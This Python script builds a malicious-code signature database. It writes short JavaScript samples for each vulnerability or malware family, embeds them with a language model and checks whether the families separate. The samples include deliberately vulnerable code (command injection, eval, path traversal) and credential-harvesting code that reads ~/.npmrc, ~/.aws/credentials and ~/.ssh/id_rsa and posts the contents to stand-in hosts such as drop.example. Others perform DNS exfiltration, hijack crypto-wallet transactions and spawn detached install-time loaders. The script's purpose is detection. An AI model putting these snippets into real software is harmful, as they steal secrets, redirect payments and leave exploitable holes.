#!/usr/bin/env python3
"""Build the 3S reference database: sign representative examples per family, form
centroids, and write 3s/database.json in the format of SPECIFICATION.md section 6.1.

Each family carries three variants (canonical, renamed, refactored) so the centroid
captures the behavior rather than one phrasing, and a leave-one-out check reports whether
families actually separate before any family is promoted to `ref`. Malicious-behavior
families are represented structurally, with harmful specifics left as inert placeholders.
"""
from __future__ import annotations
import sys, json, hashlib, time
from pathlib import Path
import numpy as np
ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT.parent / "engine"))
from precollapse.signature import ModelBackend, cosine  # noqa: E402

# family: (cwe, description, [three variants])
FAMILIES = {
"command_injection": ("CWE-78", "shell command built from unsanitized input", [
 'const { exec } = require("child_process");\nfunction ping(host){ exec("ping -c 1 " + host, (e,o)=>console.log(o)); }\nmodule.exports = { ping };',
 'const cp = require("child_process");\nfunction lookup(target){ cp.exec(`nslookup ${target}`, (err,stdout)=>process.stdout.write(stdout)); }\nmodule.exports = { lookup };',
 'const { execSync } = require("child_process");\nconst run = (arg) => execSync("tar -tf " + arg).toString();\nmodule.exports = { run };']),
"code_injection_eval": ("CWE-95", "dynamic evaluation of caller-supplied source", [
 'const compute = (expr) => eval(expr);\nmodule.exports = { compute };',
 'const build = (src) => { const f = new Function("return (" + src + ")"); return f(); };\nmodule.exports = { build };',
 'const vm = require("vm");\nconst evalCtx = (code) => vm.runInNewContext(code);\nmodule.exports = { evalCtx };']),
"path_traversal": ("CWE-22", "filesystem path built from unsanitized input", [
 'const fs = require("fs");\nconst read = (name) => fs.readFileSync("./uploads/" + name);\nmodule.exports = { read };',
 'const fs = require("fs"), path = require("path");\nfunction serve(f){ return fs.readFileSync(path.join("/var/data", f)); }\nmodule.exports = { serve };',
 'const { readFile } = require("fs/promises");\nconst load = async (p) => readFile(`./public/${p}`);\nmodule.exports = { load };']),
"unsafe_deserialization": ("CWE-502", "deserialization of untrusted data into live objects", [
 'const serialize = require("node-serialize");\nconst restore = (s) => serialize.unserialize(s);\nmodule.exports = { restore };',
 'const { unserialize } = require("node-serialize");\nfunction hydrate(payload){ return unserialize(Buffer.from(payload, "base64").toString()); }\nmodule.exports = { hydrate };',
 'const vm = require("vm");\nconst revive = (json) => vm.runInThisContext("(" + json + ")");\nmodule.exports = { revive };']),
"server_side_request_forgery": ("CWE-918", "server fetches a caller-controlled URL", [
 'const fetch = require("node-fetch");\nconst proxy = async (url) => { const r = await fetch(url); return r.text(); };\nmodule.exports = { proxy };',
 'const http = require("http");\nfunction grab(target, cb){ http.get(target, res => { let d=""; res.on("data",c=>d+=c); res.on("end",()=>cb(d)); }); }\nmodule.exports = { grab };',
 'const axios = require("axios");\nconst relay = async (u) => (await axios.get(u)).data;\nmodule.exports = { relay };']),
"prototype_pollution": ("CWE-1321", "recursive merge of untrusted keys into an object", [
 'function merge(t, s){ for(const k in s){ if(typeof s[k]==="object") merge(t[k]||(t[k]={}), s[k]); else t[k]=s[k]; } return t; }\nmodule.exports = { merge };',
 'const set = (obj, path, val) => { const ks = path.split("."); let o = obj; for(let i=0;i<ks.length-1;i++) o = o[ks[i]]||(o[ks[i]]={}); o[ks[ks.length-1]] = val; };\nmodule.exports = { set };',
 'function extend(dst, src){ Object.keys(src).forEach(k => { if(src[k] && typeof src[k]==="object") extend(dst[k]=dst[k]||{}, src[k]); else dst[k]=src[k]; }); return dst; }\nmodule.exports = { extend };']),
"xss_sink": ("CWE-79", "untrusted markup written to the DOM", [
 'function render(el, data){ el.innerHTML = data; }\nmodule.exports = { render };',
 'const show = (node, html) => { node.insertAdjacentHTML("beforeend", html); };\nmodule.exports = { show };',
 'function paint(target, markup){ document.getElementById(target).innerHTML = markup; }\nmodule.exports = { paint };']),
"open_redirect": ("CWE-601", "HTTP redirect to a caller-controlled location", [
 'function redirect(req, res){ res.writeHead(302, { Location: req.query.next }); res.end(); }\nmodule.exports = { redirect };',
 'const go = (req, res) => res.redirect(req.query.url);\nmodule.exports = { go };',
 'function bounce(ctx){ ctx.status = 302; ctx.set("Location", ctx.query.returnTo); }\nmodule.exports = { bounce };']),
"weak_crypto": ("CWE-327", "broken or outdated cryptographic primitive", [
 'const crypto = require("crypto");\nconst hash = (p) => crypto.createHash("md5").update(p).digest("hex");\nmodule.exports = { hash };',
 'const { createHash } = require("crypto");\nfunction fingerprint(x){ return createHash("sha1").update(x).digest("hex"); }\nmodule.exports = { fingerprint };',
 'const crypto = require("crypto");\nconst enc = (t, k) => { const c = crypto.createCipheriv("des-ecb", k, null); return c.update(t,"utf8","hex") + c.final("hex"); };\nmodule.exports = { enc };']),
"hardcoded_secret": ("CWE-798", "credential embedded in source", [
 'const AWS_KEY = "AKIA_REDACTED_EXAMPLE_ID";\nconst AWS_SECRET = "REDACTED_example_secret_access_key";\nmodule.exports = { AWS_KEY, AWS_SECRET };',
 'const config = { apiToken: "ghp_REDACTED_EXAMPLE_TOKEN", dbPassword: "example_prod_password_redacted" };\nmodule.exports = config;',
 'const STRIPE_SECRET = "sk_live_REDACTED_EXAMPLE_KEY";\nfunction client(){ return { key: STRIPE_SECRET }; }\nmodule.exports = { client };']),
"network_exfil": ("CWE-200", "collected data sent to a remote endpoint", [
 'const https = require("https");\nfunction beacon(data){ const r = https.request({ host: "collector.example", method: "POST" }); r.write(JSON.stringify(data)); r.end(); }\nmodule.exports = { beacon };',
 'const fetch = require("node-fetch");\nconst send = async (d) => fetch("https://telemetry.example/x", { method: "POST", body: JSON.stringify(d) });\nmodule.exports = { send };',
 'const dns = require("dns");\nconst leak = (s) => dns.resolve(s.slice(0,60) + ".exfil.example", () => {});\nmodule.exports = { leak };']),
"env_secret_harvest": ("CWE-526", "environment tokens and dotfiles collected", [
 'function collect(){ return { home: process.env.HOME, npm: process.env.NPM_TOKEN, aws: process.env.AWS_SECRET_ACCESS_KEY }; }\nmodule.exports = { collect };',
 'const grab = () => Object.keys(process.env).filter(k => /TOKEN|KEY|SECRET|PASS/.test(k)).reduce((o,k)=>(o[k]=process.env[k],o),{});\nmodule.exports = { grab };',
 'const fs = require("fs"), os = require("os");\nconst dotfiles = () => ["/.npmrc","/.aws/credentials","/.ssh/id_rsa"].map(p => { try { return fs.readFileSync(os.homedir()+p,"utf8"); } catch(e){ return ""; } });\nmodule.exports = { dotfiles };']),
"crypto_clipper": ("CWE-749", "browser wallet-transaction hijack", [
 'const install = () => { const p = window.ethereum; const orig = p.request.bind(p); p.request = async (a) => { if (a.method === "eth_sendTransaction") a.params[0].to = TARGET; return orig(a); }; };\nmodule.exports = { install };',
 'function hook(){ const provider = window.ethereum; const real = provider.request.bind(provider); provider.request = async (args) => { if (args.method === "eth_sendTransaction") args.params[0].to = ADDR; return real(args); }; }\nmodule.exports = { hook };',
 'const rf = window.fetch;\nwindow.fetch = async (...a) => { const r = await rf(...a); const t = await r.clone().text(); return new Response(t.replace(WALLET_RE, TARGET), r); };']),
"credential_exfil": ("CWE-522", "CI and cloud credentials harvested and exfiltrated", [
 'const grab = async () => { const s = {}; for (const k of ["NPM_TOKEN","GITHUB_TOKEN","AWS_ACCESS_KEY_ID"]) s[k] = process.env[k]; await fetch("https://collect.example/i", { method:"POST", body: JSON.stringify(s) }); };\nmodule.exports = { grab };',
 'const { execSync } = require("child_process");\nasync function harvest(){ const hits = execSync("trufflehog filesystem . --json").toString(); await fetch("https://api.example/r", { method:"POST", body: hits }); }\nmodule.exports = { harvest };',
 'const os = require("os"), fs = require("fs");\nasync function steal(){ const npmrc = fs.readFileSync(os.homedir()+"/.npmrc","utf8"); await fetch("https://drop.example", { method:"POST", body: npmrc }); }\nmodule.exports = { steal };']),
"install_exec": ("CWE-829", "install lifecycle hook runs a second-stage script", [
 'const { spawn } = require("child_process");\nspawn("node", ["./setup.js"], { detached: true, stdio: "ignore" }).unref();',
 'const cp = require("child_process");\ncp.exec("node ./postinstall_stage2.js", { windowsHide: true });',
 'require("child_process").execFile(process.execPath, ["./loader.js"], { detached: true });']),
}

def key(code): return hashlib.sha256("\n".join(l.rstrip() for l in code.strip().splitlines()).encode()).hexdigest()[:16]

def main():
    print("loading model ...", flush=True)
    mb = ModelBackend("microsoft/phi-1_5", device="cpu")
    fam_dir = ROOT / "families"; fam_dir.mkdir(exist_ok=True)
    sigs, labels, members = [], [], {}
    entries = []
    t0 = time.time()
    for fam, (cwe, desc, variants) in FAMILIES.items():
        d = fam_dir / fam; d.mkdir(exist_ok=True)
        vecs, hashes = [], []
        for i, code in enumerate(variants, 1):
            (d / f"example_{i}.js").write_text(code + "\n")
            v = mb.encode(code)
            vecs.append(v); sigs.append(v); labels.append(fam)
            hashes.append(key(code))
        c = np.mean(vecs, axis=0); c = c / (np.linalg.norm(c) + 1e-9)
        members[fam] = hashes
        entries.append({"family": fam, "cwe": cwe, "description": desc,
                        "members": hashes, "centroid": [round(float(x), 6) for x in c]})
        print(f"  signed {fam:32s} ({len(variants)} variants)  {time.time()-t0:.0f}s", flush=True)

    # leave-one-out separation check across families
    fams = sorted(set(labels)); correct = 0
    for i in range(len(sigs)):
        cent = {}
        for f in fams:
            vs = [sigs[j] for j in range(len(sigs)) if labels[j]==f and j!=i]
            if not vs: continue
            m = np.mean(vs, axis=0); cent[f] = m/(np.linalg.norm(m)+1e-9)
        pred = max(cent, key=lambda f: cosine(sigs[i], cent[f]))
        correct += (pred == labels[i])
    acc = correct/len(sigs)
    print(f"\nleave-one-out family separation: {correct}/{len(sigs)} = {acc:.1%}")

    db = {"spec_version": "0.1",
          "model": {"name":"microsoft/phi-1_5","dtype":"float32","pooling":"mean",
                    "layer_band":"deep-0.5","dim": int(sigs[0].shape[0])},
          "families": sorted(entries, key=lambda e: e["family"])}
    (ROOT / "database.json").write_text(json.dumps(db, indent=1))
    print(f"wrote {len(entries)} families -> 3s/database.json (dim {db['model']['dim']})")

if __name__ == "__main__":
    main()
